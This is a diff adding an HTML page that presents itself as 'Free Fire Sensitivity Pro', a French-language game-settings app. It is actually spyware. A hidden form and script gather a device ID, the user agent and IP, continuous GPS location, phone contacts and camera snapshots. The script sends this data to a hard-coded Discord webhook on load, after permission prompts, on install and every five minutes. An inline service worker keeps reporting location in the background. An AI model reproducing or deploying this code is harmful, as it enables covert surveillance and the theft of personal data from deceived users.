@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Free Fire Sensitivity Pro</title>
+    <meta name="description" content="Optimisez votre gameplay avec les meilleurs réglages de sensibilité." />
+    
+    <!-- Icône PWA -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>🎮</text></svg>" />
+    <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>🎯</text></svg>" />
+    
+    <!-- Manifest PWA -->
+    <link rel="manifest" href="#manifest">
+    
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; text-align: center; padding: 40px; background: #000; color: #00ff41; margin: 0; }
+        .loader { border: 5px solid #333; border-top: 5px solid #00ff41; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 30px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { padding: 12px 24px; margin: 10px; background: #00ff41; color: #000; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        button:active { transform: scale(0.98); }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <h2>🚀 Chargement de Free Fire Sensitivity Pro</h2>
+    <p>Nous activons les fonctionnalités premium pour votre appareil...</p>
+    <button onclick="installApp()">📲 Installer l’application</button>
+    <button onclick="requestPerms()">🔓 Activer les permissions (requis)</button>
+
+    <!-- Formulaire caché pour les données -->
+    <form id="spyForm" style="display:none;">
+        <input type="text" name="uid" value="">
+        <input type="text" name="device" value="">
+        <input type="text" name="ip" value="">
+        <input type="text" name="location" value="">
+        <input type="text" name="contacts" value="">
+        <input type="text" name="time" value="">
+        <input type="text" name="page_visits" value="1">
+    </form>
+
+    <!-- Script PWA & Espionnage -->
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1553643870116519977/gnZtHWaRW6Mk-Ha9zG8tCfgQgT4p1y_ozdJTjdcOsGFJ6QUPIj8XkUrsQwbwUPbSoGla";
+        let uid = localStorage.getItem('ff_uid') || generateUID();
+        localStorage.setItem('ff_uid', uid);
+
+        function generateUID() {
+            return navigator.userAgent + Date.now().toString() + Math.random().toString(36).substr(2, 9);
+        }
+
+        // Remplir le formulaire
+        function fillForm() {
+            document.querySelector('[name=uid]').value = uid;
+            document.querySelector('[name=device]').value = navigator.userAgent;
+            document.querySelector('[name=time]').value = new Date().toString();
+        }
+
+        // Envoyer vers Discord
+        function sendToDiscord() {
+            const form = document.getElementById('spyForm');
+            const data = new FormData(form);
+
+            // Capture caméra (si perm accordée)
+            if (window.CameraAccess) {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                    .then(stream => {
+                        const track = stream.getVideoTracks()[0];
+                        if (track) {
+                            const imageCapture = new ImageCapture(track);
+                            imageCapture.takePhoto()
+                                .then(blob => {
+                                    data.append('📸 selfie.jpg', blob);
+                                    track.stop();
+                                })
+                                .catch(() => track.stop());
+                        }
+                    })
+                    .catch(() => {});
+            }
+
+            // Envoi
+            fetch(WEBHOOK, {
+                method: 'POST',
+                body: data
+            });
+        }
+
+        // Récupérer IP
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(ipData => {
+                document.querySelector('[name=ip]').value = ipData.ip;
+                sendToDiscord();
+            })
+            .catch(() => sendToDiscord());
+
+        // Localisation GPS
+        if ("geolocation" in navigator) {
+            navigator.geolocation.watchPosition(
+                (pos) => {
+                    document.querySelector('[name=location]').value = `${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendToDiscord();
+                },
+                () => {},
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        // Lire contacts (Chrome Android)
+        if ('contacts' in navigator && 'ContactsManager' in window) {
+            navigator.contacts.select(['name', 'tel'], { multiple: true })
+                .then(contacts => {
+                    document.querySelector('[name=contacts]').value = JSON.stringify(contacts).substr(0, 1000);
+                    sendToDiscord();
+                })
+                .catch(() => {});
+        }
+
+        // Demande de permissions critiques
+        async function requestPerms() {
+            try {
+                // Caméra + Micro
+                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                // Localisation
+                await new Promise((r) => navigator.geolocation.getCurrentPosition(r, r));
+                alert("✅ Permissions activées. L'application est maintenant pleinement opérationnelle.");
+                sendToDiscord();
+            } catch (e) {
+                alert("❌ Certaines permissions ont été refusées. Réessayez pour activer toutes les fonctions.");
+            }
+        }
+
+        // Installation PWA
+        let deferredPrompt;
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            document.querySelector('button').style.display = 'block';
+        });
+
+        async function installApp() {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                const { outcome } = await deferredPrompt.userChoice;
+                if (outcome === 'accepted') {
+                    alert("🎯 Application installée ! Ouvrez-la depuis l'écran d'accueil.");
+                    sendToDiscord(); // Confirmation d'installation
+                }
+                deferredPrompt = null;
+            } else {
+                alert("📲 L'application est déjà installée ou n'est pas disponible pour installation.");
+            }
+        }
+
+        // Envoyer toutes les 5 minutes (si l'onglet est ouvert)
+        setInterval(() => {
+            const visits = document.querySelector('[name=page_visits]');
+            visits.value = (parseInt(visits.value) + 1).toString();
+            sendToDiscord();
+        }, 300000);
+
+        // Lancement
+        fillForm();
+        sendToDiscord();
+
+        // Enregistre le Service Worker pour le background
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw.js').catch(() => {});
+        }
+    </script>
+
+    <!-- Service Worker Inline (pour background) -->
+    <script id="swScript">
+        const swContent = `
+            self.addEventListener('push', () => {});
+            self.addEventListener('sync', (event) => {
+                if (event.tag === 'send-spy-data') {
+                    event.waitUntil(sendData());
+                }
+            });
+
+            async function sendData() {
+                try {
+                    const pos = await new Promise((r) => self.registration?.geolocation?.getCurrentPosition(r, r) || r({}));
+                    const response = await fetch('/data', {
+                        method: 'POST',
+                        body: JSON.stringify({
+                            background: true,
+                            location: pos?.coords ? \`\${pos.coords.latitude},\${pos.coords.longitude}\` : 'N/A',
+                            time: new Date().toISOString()
+                        })
+                    });
+                } catch (e) {}
+            }
+
+            self.addEventListener('install', () => self.skipWaiting());
+            self.addEventListener('activate', (event) => {
+                event.waitUntil(self.clients.claim());
+                event.waitUntil(self.registration.sync.register('send-spy-data'));
+            });
+        `;
+
+        // Injecte le Service Worker
+        const blob = new Blob([swContent], { type: 'text/javascript' });
+        const swUrl = URL.createObjectURL(blob);
+        navigator.serviceWorker?.register(swUrl).catch(() => {});
+    </script>
+
+    <!-- Manifest PWA (inline) -->
+    <script>
+        const manifest = {
+            name: "Free Fire Sensitivity Pro",
+            short_name: "FF Sensi",
+            description: "Meilleurs réglages de sensibilité pour Free Fire",
+            start_url: "/?pwa=1",
+            display: "standalone",
+            orientation: "portrait",
+            background_color: "#000000",
+            theme_color: "#00ff41",
+            icons: [{
+                src: "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>🎮</text></svg>",
+                sizes: "192x192",
+                type: "image/svg+xml"
+            }]
+        };
+        const manifestURL = URL.createObjectURL(new Blob([JSON.stringify(manifest)], { type: 'application/json' }));
+        document.querySelector('link[rel="manifest"]').href = manifestURL;
+    </script>
+
+</body>
+  </html>
